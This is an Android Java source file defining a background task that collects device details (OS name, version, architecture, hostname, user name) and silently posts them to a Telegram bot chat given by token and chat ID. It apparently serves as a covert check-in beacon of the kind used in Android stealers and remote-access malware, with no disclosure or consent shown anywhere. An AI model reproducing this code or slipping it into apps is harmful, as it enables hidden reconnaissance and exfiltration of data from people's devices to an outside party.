package com.wolf.rabbit;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class SystemInfoSenderTask extends AsyncTask<Void, Void, Boolean> {

    private static final String TAG = "SystemInfoSenderTask";
    private String botToken;
    private String chatId;
    private Context context;

    public SystemInfoSenderTask(Context context, String botToken, String chatId) {
        this.context = context;
        this.botToken = botToken;
        this.chatId = chatId;
    }

    @Override
    protected Boolean doInBackground(Void... params) {
        try {
            String systemInfo = getSystemInfo();
            String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);

            String data = "chat_id=" + chatId + "&text=" + systemInfo;
            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes());
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Response Code: " + responseCode);

            conn.disconnect();
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error sending system info: " + e.getMessage());
            return false;
        }
    }

    private String getSystemInfo() {
        try {
            InetAddress addr = InetAddress.getLocalHost();
            String hostname = addr.getHostName();

            String system = "System: " + System.getProperty("os.name");
            String node = "Node Name: " + hostname;
            String release = "Release: " + System.getProperty("os.version");
            String version = "Version: " + System.getProperty("os.arch");
            String machine = "Machine: " + System.getProperty("os.name");
            String user = "User: " + System.getProperty("user.name");

            return system + "\n" + node + "\n" + release + "\n" + version + "\n" + machine + "\n" + user;
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return "Error getting system info";
        }
    }
}
